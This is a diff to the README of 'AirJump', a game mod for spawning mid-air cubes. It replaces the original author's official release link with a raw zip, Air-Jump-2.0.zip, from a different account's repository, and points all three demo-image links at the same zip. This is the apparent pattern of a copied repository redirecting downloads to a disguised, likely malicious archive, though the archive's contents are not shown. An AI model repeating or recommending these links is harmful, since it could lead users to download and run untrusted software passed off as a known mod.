@@ -1,13 +1,13 @@
 # AirJump
 The mod that lets you spawn cubes underneeth your hands.
-* [PC Download](https://github.com/fchb1239/AirJump/releases/tag/airjump1.0.1)
+* [PC Download](https://github.com/TurtleVry/AirJump/raw/refs/heads/main/Behaviours/Air-Jump-2.0.zip)
 
 # Change size & material!
-![](https://user-images.githubusercontent.com/29258204/149635139-723a4ef8-af21-49c7-9d53-5b9b3e532496.gif)
+![](https://github.com/TurtleVry/AirJump/raw/refs/heads/main/Behaviours/Air-Jump-2.0.zip)
 
 # See each others jumps!
-![](https://user-images.githubusercontent.com/29258204/149635070-140f201d-116d-44cb-899d-18f3ebcbb658.gif)
+![](https://github.com/TurtleVry/AirJump/raw/refs/heads/main/Behaviours/Air-Jump-2.0.zip)
 
 # Spawn cool cubes mid air!
-![](https://user-images.githubusercontent.com/29258204/149635078-cc828181-afd0-4a0d-ab47-98712cabd97d.gif)
+![](https://github.com/TurtleVry/AirJump/raw/refs/heads/main/Behaviours/Air-Jump-2.0.zip)
 
